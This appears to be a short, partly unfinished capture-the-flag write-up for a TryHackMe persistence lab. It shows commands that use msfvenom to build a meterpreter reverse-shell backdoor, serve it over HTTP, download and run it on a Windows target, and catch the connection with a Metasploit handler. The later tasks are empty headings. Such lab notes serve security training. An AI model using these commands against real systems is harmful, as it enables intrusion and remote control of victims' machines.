---
description: https://tryhackme.com/room/persistence
---

# Persistence

## Task 2 Low privilege user persistence?

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.6.9.176 \
         -a x86 --platform windows -f exe -o backdoor.exe
cp backdoor.exe /var/www/html
```

![](<../../.gitbook/assets/Screenshot from 2022-03-15 06-37-35.png>)

```bash
Invoke-WebRequest http://10.6.9.176/backdoor.exe -OutFile backdoor.exe
.\backdoor.exe
```

![](<../../.gitbook/assets/Screenshot from 2022-03-15 06-42-13.png>)

```bash
msfconsole -q
msf > use exploit/multi/handler
msf > set payload windows/meterpreter/reverse_tcp
msf > set LHOST 10.6.9.176
msf > run
```

![](<../../.gitbook/assets/Screenshot from 2022-03-15 06-42-51.png>)

#### What kind of persistence can/might BITS give?

```bash
```

## Task 3 High privilege user persistence





## Task 4 Hash dumping
